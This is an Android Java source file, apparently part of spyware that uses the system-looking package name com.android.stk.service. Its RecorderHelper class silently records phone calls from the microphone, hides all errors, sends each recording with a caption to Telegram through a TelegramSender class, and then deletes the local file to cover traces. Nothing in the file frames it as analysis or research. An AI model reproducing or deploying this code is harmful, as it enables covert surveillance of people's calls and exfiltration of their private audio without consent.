package com.android.stk.service;

import android.content.Context;
import android.media.MediaRecorder;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RecorderHelper {

    private static MediaRecorder recorder;
    private static File outputFile;

    public static void startRecording(Context context, String number) {
        try {
            File cacheDir = context.getCacheDir();
            if (cacheDir == null) return;

            String fileName = "call_" + new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date()) + ".3gp";
            outputFile = new File(cacheDir, fileName);

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC); // Gunakan mic
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

        } catch (Exception ignored) {
            // Silent fail
        }
    }

    public static void stopRecording(Context context) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;

                if (outputFile != null && outputFile.exists()) {
                    String caption = "📞 Rekaman panggilan selesai: " + outputFile.getName();
                    TelegramSender.sendText("📤 Mengirim rekaman...");
                    TelegramSender.sendAudio(outputFile, caption);

                    outputFile.delete(); // Hapus setelah kirim
                    outputFile = null;
                }
            }
        } catch (Exception ignored) {
            // Silent fail
        }
    }
}
